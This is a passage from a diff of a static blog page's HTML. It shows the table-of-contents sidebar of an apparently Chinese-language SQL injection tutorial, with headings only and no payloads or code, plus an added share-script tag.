class="toc-text">神奇的特性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#列名重复"><span class="toc-number">2.4.1.</span> <span class="toc-text">列名重复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#几何函数"><span class="toc-number">2.4.2.</span> <span class="toc-text">几何函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#盲注"><span class="toc-number">3.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#布尔盲注"><span class="toc-number">3.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间盲注"><span class="toc-number">3.2.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错盲注"><span class="toc-number">3.3.</span> <span class="toc-text">报错盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一些神奇的技巧"><span class="toc-number">4.</span> <span class="toc-text">一些神奇的技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#宽字节注入"><span class="toc-number">4.1.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#like注入"><span class="toc-number">4.2.</span> <span class="toc-text">like注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#异或注入"><span class="toc-number">4.3.</span> <span class="toc-text">异或注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#innodb引擎的注入"><span class="toc-number">4.4.</span> <span class="toc-text">innodb引擎的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#无列名注入"><span class="toc-number">4.5.</span> <span class="toc-text">无列名注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#约束攻击"><span class="toc-number">4.6.</span> <span class="toc-text">约束攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过SQL注入读取文件"><span class="toc-number">4.7.</span> <span class="toc-text">通过SQL注入读取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过SQL注入写文件"><span class="toc-number">4.8.</span> <span class="toc-text">通过SQL注入写文件</span></a></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -2082,6 +2070,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
